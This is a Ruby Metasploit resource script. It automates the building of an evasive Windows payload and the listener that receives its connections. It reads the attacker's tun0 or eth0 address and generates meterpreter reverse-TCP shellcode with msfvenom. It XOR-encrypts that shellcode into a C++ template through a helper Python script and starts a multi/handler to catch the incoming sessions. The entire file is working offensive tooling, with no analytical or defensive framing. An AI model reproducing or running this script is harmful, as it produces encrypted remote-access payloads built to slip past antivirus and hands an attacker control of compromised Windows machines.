<ruby>
CWD = Dir.pwd
PAYLOAD = 'windows/x64/meterpreter_reverse_tcp'
OUTPUT_DIR = "#{CWD}/payloads"

def payload_lhost
  tun0_ip = %x(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d/ -f1).strip
  if tun0_ip.empty?
    %x(ip addr show eth0 | grep "inet " | awk '{print $2}' | cut -d/ -f1).strip
  else
    tun0_ip
  end
end

def payload_lport
  framework.datastore['LPORT'] || 80
end

sleep(1)

print_status("#{PAYLOAD}'s LHOST=#{payload_lhost}, LPORT=#{payload_lport}")
print_status("#{PAYLOAD} is at #{OUTPUT_DIR}")

# Generate raw shellcode using msfvenom and store in a temp file
%x(msfvenom -p #{PAYLOAD} LHOST=#{payload_lhost} LPORT=#{payload_lport} -f raw > tmp_shellcode)

# Read the shellcode from the temp file
raw_shellcode = %x(cat tmp_shellcode)

# Run the Python script to generate the C++ payload with encrypted shellcode
xor_key = %x(cat tmp_shellcode | python3 generate_payload.py "#{OUTPUT_DIR}/payload.cpp").strip.split(": ")[-1]

# Remove the temp shellcode file
%x(rm tmp_shellcode)

print_status("Generated C++ template with encrypted shellcode at: #{OUTPUT_DIR}/payload.cpp")
print_status(xor_key)

run_single('use exploit/multi/handler')
run_single("set payload #{PAYLOAD}")
run_single("set lhost #{payload_lhost}")
run_single("set lport #{payload_lport}")
run_single('set exitonsession false')


</ruby>
